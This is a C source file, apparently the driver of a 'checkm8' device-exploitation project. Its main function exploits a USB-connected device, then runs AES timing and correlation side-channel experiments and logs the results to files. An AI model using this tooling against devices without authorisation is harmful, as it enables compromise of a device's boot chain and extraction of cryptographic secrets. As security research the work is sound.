#include "checkm8.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <math.h>
#include <unistd.h>

#include "payload.h"
#include "usb_helpers.h"
#include "bootrom_type.h"
#include "experiments.h"
#include "host_crypto.h"

#ifdef CHECKM8_LOGGING

#include <stdarg.h>
#include <execinfo.h>

#endif

void checkm8_debug_indent(const char *format, ...)
{
#ifdef CHECKM8_LOGGING
    void *traces[100];
    int depth = backtrace(traces, 100) - 5;
    for(int i = 0; i < depth; i++)
    {
        printf("\t");
    }
    va_list args;

    va_start(args, format);
    vprintf(format, args);
    va_end(args);
#endif
}

void checkm8_debug_block(const char *format, ...)
{
#ifdef CHECKM8_LOGGING
    va_list args;

    va_start (args, format);
    vprintf(format, args);
    va_end(args);
#endif
}

void record_bern_data(struct bern_data *data)
{
    int j, b;
    double u[16][256];
    double udev[16][256];
    double taverage;

    FILE *outfile;
    char linebuf[256];

    printf("have count %lli k\n", data->count / 16 / 100000);
    taverage = data->ttotal / (double) data->count;

    for(j = 0; j < 16; j++)
    {
        for(b = 0; b < 256; b++)
        {
            u[j][b] = data->t[j][b] / data->tnum[j][b];
            udev[j][b] = data->tsq[j][b] / data->tnum[j][b];
            udev[j][b] -= u[j][b] * u[j][b];
            udev[j][b] = sqrt(udev[j][b]);
        }
    }

    sprintf(linebuf, "dat_%lli.dat", data->count / 16 / 100000);
    outfile = fopen(linebuf, "w+");
    if(outfile == NULL)
    {
        printf("failed to open data file\n");
        return;
    }

    for(j = 0; j < 16; j++)
    {
        for(b = 0; b < 256; b++)
        {
            sprintf(linebuf,
                    "%2d %3d %lli %f %f %f %f\n",
                    j, b, (long long) data->tnum[j][b],
                    u[j][b], udev[j][b],
                    u[j][b] - taverage, udev[j][b] / sqrt(data->tnum[j][b]));
            fputs(linebuf, outfile);
        }
    }

    fclose(outfile);
}

void run_corr_exp(struct pwned_device *dev, char *fname)
{
    int i;
    FILE *outfile;
    DEV_PTR_T addr_async_buf;

    struct aes_constants *c = get_constants();
    struct corr_data *data;

    unsigned char msg[16];
    unsigned char key[16];
    unsigned char key_sched[176];

    for(i = 0; i < 16; i++)
    {
        msg[i] = 0;
        key[i] = 0x1;
    }

    expand_key(key, key_sched, 11, c);

    outfile = fopen(fname, "wb");
    if(outfile == NULL)
    {
        printf("failed to open outfile\n");
        return;
    }

    addr_async_buf = setup_corr_exp(dev, key);
    printf("got async buf ptr %llx\n", addr_async_buf);
    if(addr_async_buf == DEV_PTR_NULL)return;

    while(1)
    {
        data = get_corr_exp_data(dev, addr_async_buf);

        for(i = 0; i < N_CORR_ENTRIES; i++)
        {
            fwrite(msg, 1, sizeof(msg), outfile);
            fwrite("\x00", 1, 1, outfile);
            fwrite(&data->data[i], 1, 1, outfile);
            fwrite("\x00", 1, 1, outfile);

            aes128_encrypt_ecb(msg, 16, key_sched, c);
        }

        fflush(outfile);
        for(i = 0; i < 16; i++)
        {
            if(msg[i] != data->msg[i])
            {
                printf("aes error! message mismatch\n");
                free(data);
                return;
            }
        }

        free(data);
    }
}

int main()
{
    struct pwned_device *dev = exploit_device();

    if(dev == NULL || dev->status == DEV_NORMAL)
    {
        printf("Failed to exploit device\n");
        return -1;
    }

    fix_heap(dev);
    demote_device(dev);

    run_corr_exp(dev, "test.out");
    free_device(dev);
}











